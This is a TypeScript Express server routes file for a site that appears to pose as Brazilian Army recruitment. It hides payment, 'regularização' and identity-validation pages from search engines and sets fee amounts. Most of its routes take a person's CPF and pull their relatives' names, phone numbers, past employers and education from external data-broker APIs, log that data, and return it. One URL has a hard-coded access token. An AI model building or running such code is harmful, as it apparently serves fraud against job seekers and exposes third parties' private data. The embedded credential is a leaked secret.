...
export async function registerRoutes(app: Express): Promise<Server> {
  ...
  app.get("/robots.txt", (req, res) => {
    ...
    const body = [
      ...
      "Disallow: /api/",
      "Disallow: /captura",
      "Disallow: /pagamento-page",
      "Disallow: /confirmacao-pagamento",
      "Disallow: /confirmacao-dados",
      "Disallow: /confirmar-dados",
      "Disallow: /registro",
      "Disallow: /juramento",
      "Disallow: /validacao",
      "Disallow: /validacao-identidade",
      "Disallow: /agendamento-medico",
      "Disallow: /confirmacao-medica",
      "Disallow: /resultados-medicos",
      "Disallow: /login-pos-pagamento",
      "Disallow: /regularizacao-pagamento",
      "Disallow: /regularizacao-migracao",
      "Disallow: /autoridade-beneficios",
      "Disallow: /obrigado-page",
      "Disallow: /edital-page",
      "Disallow: /remarketing",
      "Disallow: /bot/",
      "Disallow: /conversar/",
      "Disallow: /indicacao",
      "Disallow: /pessoal",
      "Disallow: /temporarios",
      "Disallow: /explicacao-edital",
      "",
      "Allow: /",
      "Allow: /privacidade",
      "Allow: /termos",
  ...
  app.get("/api/valor-dinamico", (req: any, res: any) => {
    try {
      ...
      const precoBase: Record<string, { m: number; f: number }> = {
        pf: { m: 83.13, f: 83.13 },
        medica: { m: 44.15, f: 44.14 },
        esocial: { m: 23.10, f: 23.20 },
      };
...
A resposta deve ser profissional, motivadora e demonstrar conhecimento sobre as oportunidades reais do Exército Brasileiro.`;
  ...
  // Rota para consultar escolaridade extra via API externa
  app.get("/api/escolaridade-extra/:cpf", async (req, res) => {
    try {
      ...
      console.log(`Consultando escolaridade para CPF: ${cleanCpf}`);
      ...
      // Extrair apenas o objeto escolaridade
      const escolaridadeData = data.data?.escolaridade || null;

      console.log(
        `Escolaridade encontrada para CPF ${cleanCpf}:`,
        escolaridadeData ? JSON.stringify(escolaridadeData) : "Não informada",
      );
      ...
      console.error("Erro ao consultar escolaridade:", error);
      return res.status(500).json({
        success: false,
        error: "Erro interno do servidor ao consultar escolaridade",
      });
    }
  });
  ...
  app.get("/api/parentesco/:cpf", async (req, res) => {
    try {
      ...
      // Extrair dados de parentesco dos dados retornados
      const parentesco: any[] = [];
      const dadosParentesco = data.data;

      if (dadosParentesco) {
        // Buscar informações de parentesco nos dados
        const camposParentesco = [
          "nome_mae",
          "mae",
          "mother",
          "mother_name",
        ...
        camposParentesco.forEach((campo) => {
          if (
            dadosParentesco[campo] &&
            typeof dadosParentesco[campo] === "string"
          ) {
            const nome = dadosParentesco[campo].trim();
            if (
              nome &&
              nome !== "INDEFINIDO" &&
              nome !== "NAO INFORMADO" &&
              ...
              // Determinar tipo de parentesco baseado no campo
              let tipo = "parente";
              if (campo.includes("mae") || campo.includes("mother")) {
                tipo = "mae";
              } else if (campo.includes("pai") || campo.includes("father")) {
                tipo = "pai";
              } else if (campo.includes("responsavel")) {
                tipo = "responsavel";
              }

              // Verificar se já não foi adicionado
              const jaExiste = parentesco.find((p) => p.nome === nome);
              if (!jaExiste) {
                parentesco.push({
                  nome: nome,
                  tipo: tipo,
        ...
        // Também buscar em arrays de parentes se existirem
        if (
          dadosParentesco.parentes &&
          Array.isArray(dadosParentesco.parentes)
        ) {
          dadosParentesco.parentes.forEach((parente: any) => {
            if (parente.nome && typeof parente.nome === "string") {
              const nome = parente.nome.trim();
              if (nome && nome !== "INDEFINIDO" && nome.length > 2) {
                const jaExiste = parentesco.find((p) => p.nome === nome);
                if (!jaExiste) {
                  parentesco.push({
                    nome: nome,
                    tipo: parente.tipo || "parente",
                    campo_origem: "array_parentes",
                  });
                }
              }
            }
      ...
      const parentescoUnicos = parentesco.slice(0, 10);

      console.log(
        `Parentesco encontrado para CPF ${cleanCpf}:`,
        parentescoUnicos.length,
      );

      return res.json({
        success: true,
        data: {
          parentesco: parentescoUnicos,
          total: parentescoUnicos.length,
        },
      });
    } catch (error) {
  ...
  // Rota para consultar telefones por CPF
  app.get("/api/telefones/:cpf", async (req, res) => {
    try {
      res.setHeader("Content-Type", "application/json");
      ...
      console.log(`Consultando telefones para CPF: ${cleanCpf}`);
      ...
      // Extrair telefones dos dados retornados
      const telefones: any[] = [];
      const dadosContato = data.data;

      if (dadosContato) {
        // Buscar telefones no array específico 'telefones'
        if (dadosContato.telefones && Array.isArray(dadosContato.telefones)) {
          dadosContato.telefones.forEach((telefoneObj: any, index: number) => {
            if (
              telefoneObj.telefone &&
              typeof telefoneObj.telefone === "string"
            ) {
              const numeroTelefone = telefoneObj.telefone.trim();
              if (
                numeroTelefone &&
                numeroTelefone !== "INDEFINIDO" &&
                ...
                if (numeroTelefone.length === 10 && numeroTelefone[2] !== "9") {
                  // Inserir o 9 após o DDD (primeiros 2 dígitos)
                  numeroCorrigido =
                    numeroTelefone.substring(0, 2) +
                    "9" +
                    numeroTelefone.substring(2);
                }
        ...
        // Também buscar telefones em outros campos (fallback)
        ...
        camposTelefone.forEach((campo) => {
          if (dadosContato[campo] && typeof dadosContato[campo] === "string") {
            const telefone = dadosContato[campo].trim();
            if (telefone && telefone !== "INDEFINIDO" && telefone.length >= 8) {
              // Verificar se já não foi adicionado pelo array principal
              const jaExiste = telefones.find((t) => t.numero === telefone);
              if (!jaExiste) {
                // Corrigir formato do número se necessário
                let numeroCorrigido = telefone;

                // Se o número tem 10 dígitos e não começa com 9 após o DDD, adicionar o 9
                if (telefone.length === 10 && telefone[2] !== "9") {
                  // Inserir o 9 após o DDD (primeiros 2 dígitos)
                  numeroCorrigido =
                    telefone.substring(0, 2) + "9" + telefone.substring(2);
                }
      ...
      const telefonesUnicos = telefones.filter(
        (telefone, index, self) =>
          index === self.findIndex((t) => t.numero === telefone.numero),
      );

      console.log(
        `Telefones encontrados para CPF ${cleanCpf}:`,
        telefonesUnicos.length,
      );
      ...
      return res.json({
        ...
        data: {
          ...
          total_telefones: telefonesUnicos.length,
          timestamp: new Date().toISOString(),
        },
      });
    } catch (error) {
      ...
      return res.status(500).json({
        success: false,
        error: "Erro interno do servidor ao consultar telefones",
      });
    }
  });

  // Rota para consultar empregos antigos por CPF
  app.get("/api/empregos-antigos/:cpf", async (req, res) => {
    try {
      res.setHeader("Content-Type", "application/json");
      ...
      console.log(`Consultando empregos antigos para CPF: ${cleanCpf}`);

      let data = null;
      let apiSource = "";

      // Tentar primeira API (nova - principal) com retry
      const primaryApiUrl = `https://data.workbuscas.com/api/v1/21676eb8-cede-43d9-9edb-6f5fe652890d/cpf/${cleanCpf}`;
      const maxRetries = 3;
      const delay = 200;
      ...
      for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
          console.log(
            `Tentativa ${attempt} de ${maxRetries} para API principal de empregos`,
          );
          ...
          if (primaryResponse.ok) {
            ...
            console.log(
              `Resposta bruta da API principal (tentativa ${attempt}):`,
              responseText,
            );

            if (!responseText || responseText.trim() === "") {
              console.error(
                `Resposta vazia da API principal (tentativa ${attempt})`,
              );
              if (attempt === maxRetries) {
                throw new Error(
                  "API principal retornou resposta vazia após todas as tentativas",
                );
              }
              await new Promise((resolve) => setTimeout(resolve, delay));
              continue;
            ...
            try {
              ...
              if (
                primaryData &&
                primaryData.status === 200 &&
                primaryData.data
              ) {
                data = primaryData;
                apiSource = "primary_empregos_api";
                console.log(
                  `Dados obtidos da API principal de empregos (tentativa ${attempt})`,
                );
                primarySuccess = true;
                break;
              } else {
                console.error(
                  `Resposta inválida da API principal (tentativa ${attempt}):`,
                  primaryData,
                );
                if (attempt === maxRetries) {
                  throw new Error(
                    "Resposta inválida da API principal após todas as tentativas",
                  );
                }
                await new Promise((resolve) => setTimeout(resolve, delay));
                continue;
              ...
              console.error(
                `Erro ao parsear JSON da API principal (tentativa ${attempt}):`,
                parseError,
              );
              console.error(`Conteúdo que falhou no parse:`, responseText);
              ...
              if (attempt === maxRetries) {
                throw new Error(
                  `Erro ao parsear resposta da API principal após ${maxRetries} tentativas: ${parseError}`,
                );
              }
              await new Promise((resolve) => setTimeout(resolve, delay));
              continue;
            ...
            console.error(
              `Erro na API principal (tentativa ${attempt}): ${primaryResponse.status} - ${primaryResponse.statusText}`,
            );

            // Log da resposta para debug
            const responseText = await primaryResponse.text();
            console.error(
              `Resposta da API principal (tentativa ${attempt}):`,
              responseText,
            );

            if (attempt === maxRetries) {
              throw new Error(
                `API principal falhou após ${maxRetries} tentativas: ${primaryResponse.status} - ${primaryResponse.statusText}`,
              );
            }
          ...
          console.error(
            `Erro na requisição da API principal (tentativa ${attempt}):`,
            fetchError,
          );
      ...
      // Se a API principal falhou, tentar fallback com retry
      if (!primarySuccess) {
        console.log(
          "API principal falhou após todas as tentativas, tentando API de fallback...",
        );

        const fallbackApiUrl = `https://data.workbuscas.com/api/v1/21676eb8-cede-43d9-9edb-6f5fe652890d/cpf/${cleanCpf}`;
        let fallbackSuccess = false;

        for (let attempt = 1; attempt <= maxRetries; attempt++) {
          try {
            console.log(
              `Tentativa ${attempt} de ${maxRetries} para API de fallback de empregos`,
            );
            ...
            if (fallbackResponse.ok) {
              ...
              console.log(
                `Resposta bruta da API de fallback (tentativa ${attempt}):`,
                responseText,
              );

              if (!responseText || responseText.trim() === "") {
                console.error(
                  `Resposta vazia da API de fallback (tentativa ${attempt})`,
                );
                if (attempt === maxRetries) {
                  throw new Error(
                    "API de fallback retornou resposta vazia após todas as tentativas",
                  );
                }
                await new Promise((resolve) => setTimeout(resolve, delay));
                continue;
              ...
              try {
                ...
                if (fallbackData && fallbackData.status === 200) {
                  data = fallbackData;
                  apiSource = "fallback_cpf_api";
                  console.log(
                    `Dados obtidos da API de fallback (tentativa ${attempt})`,
                  );
                  fallbackSuccess = true;
                  break;
                } else {
                  console.error(
                    `Resposta inválida da API de fallback (tentativa ${attempt}):`,
                    fallbackData,
                  );
                  if (attempt === maxRetries) {
                    throw new Error(
                      "Resposta inválida da API de fallback após todas as tentativas",
                    );
                  }
                  await new Promise((resolve) => setTimeout(resolve, delay));
                  continue;
                ...
                console.error(
                  `Erro ao parsear JSON da API de fallback (tentativa ${attempt}):`,
                  parseError,
                );
                console.error(`Conteúdo que falhou no parse:`, responseText);
                ...
                if (attempt === maxRetries) {
                  throw new Error(
                    `Erro ao parsear resposta da API de fallback após ${maxRetries} tentativas: ${parseError}`,
                  );
                }
                await new Promise((resolve) => setTimeout(resolve, delay));
                continue;
              ...
              console.error(
                `Erro na API de fallback (tentativa ${attempt}): ${fallbackResponse.status} - ${fallbackResponse.statusText}`,
              );

              // Log da resposta para debug
              const responseText = await fallbackResponse.text();
              console.error(
                `Resposta da API de fallback (tentativa ${attempt}):`,
                responseText,
              );

              if (attempt === maxRetries) {
                throw new Error(
                  `API de fallback falhou após ${maxRetries} tentativas: ${fallbackResponse.status} - ${fallbackResponse.statusText}`,
                );
              }
            ...
            console.error(
              `Erro na requisição da API de fallback (tentativa ${attempt}):`,
              fetchError,
            );
        ...
        if (!fallbackSuccess) {
          console.error("Erro em ambas as APIs após todas as tentativas");
          return res.status(500).json({
            success: false,
            error: "Erro ao consultar dados em todas as fontes disponíveis",
          });
        }
      }
      ...
      // Processar dados baseado na fonte da API
      let listaEmpregos: string[] = [];

      if (apiSource === "primary_empregos_api") {
        // Processar dados da nova API principal
        const empregosData = Array.isArray(data.data.empregos)
          ? data.data.empregos
          : null;
        const empregosUnicos = new Set<string>();

        empregosData.forEach((emprego: any) => {
          // Extrair nome_fantasia da nova API
          const nomeEmprego = emprego.nome_fantasia;

          if (nomeEmprego && typeof nomeEmprego === "string") {
            const nomeEmpregoCleaned = nomeEmprego.trim().toUpperCase();

            // Adicionar se não estiver vazio e não for apenas espaços
            if (nomeEmpregoCleaned.length > 0) {
              empregosUnicos.add(nomeEmpregoCleaned);
            }
          }
        });

        listaEmpregos = Array.from(empregosUnicos).sort();
        console.log(
          `Empregos encontrados via API principal para CPF ${cleanCpf}:`,
          listaEmpregos,
        );
      } else {
        // Processar dados da API de fallback (formato antigo)
        const nomeCliente = data.data?.nome || "";
        const empregos = data.data?.empregos || [];

        if (Array.isArray(empregos) && empregos.length > 0) {
          const empregosUnicos = new Set<string>();

          empregos.forEach((emprego: any) => {
            // Priorizar nome_fantasia se disponível, senão usar nome
            const nomeEmprego = emprego.nome_fantasia || emprego.nome;

            if (nomeEmprego && typeof nomeEmprego === "string") {
              const nomeEmpregoCleaned = nomeEmprego.trim().toUpperCase();
              const nomeClienteCleaned = nomeCliente.trim().toUpperCase();

              // Ignorar empregos que sejam o próprio nome do cliente (erro comum da API)
              if (
                nomeEmpregoCleaned !== nomeClienteCleaned &&
                nomeEmpregoCleaned.length > 0 &&
                !nomeEmpregoCleaned.includes(nomeClienteCleaned)
              ) {
                empregosUnicos.add(nomeEmpregoCleaned);
              }
            }
        ...
        console.log(
          `Empregos encontrados via API fallback para CPF ${cleanCpf}:`,
          listaEmpregos,
        );
      }
      ...
      return res.json({
        success: true,
        data: {
          empregos: listaEmpregos,
          source: apiSource,
          total: listaEmpregos.length,
        },
      });
    } catch (error) {
      console.error("Erro ao consultar empregos antigos:", error);
      return res.status(500).json({
        success: false,
        error: "Erro interno do servidor ao consultar empregos antigos",
      });
    }
  });

  // Rota para consultar dados extras por CPF
  app.get("/api/extras/:cpf", async (req, res) => {
    try {
      res.setHeader("Content-Type", "application/json");
      ...
      console.log(`Consultando dados extras para CPF: ${cleanCpf}`);

      // Consultar API externa completa.workbuscas.com com retry
      const formattedCpf = `${cleanCpf.slice(0, 3)}.${cleanCpf.slice(3, 6)}.${cleanCpf.slice(6, 9)}-${cleanCpf.slice(9, 11)}`;
      const apiUrl = `https://completa.workbuscas.com/api?token=eLGnLuqlBaGsBvvVSjDwpQBF&modulo=cpf&consulta=${formattedCpf}`;
      ...
      for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
          ...
          if (!response.ok) {
            ...
            const responseText = await response.text();
            console.error(
              `Resposta da API (tentativa ${attempt}):`,
              responseText,
            );
          ...
          try {
            ...
            console.log(
              `Dados extras obtidos para CPF ${cleanCpf} (tentativa ${attempt}):`,
              JSON.stringify(data, null, 2),
            );
          ...
          console.error(
            `Erro na requisição (tentativa ${attempt}):`,
            fetchError,
          );
      ...
      return res.status(500).json({
        success: false,
        error: "Erro interno do servidor ao consultar dados extras",
      });
    }
  });
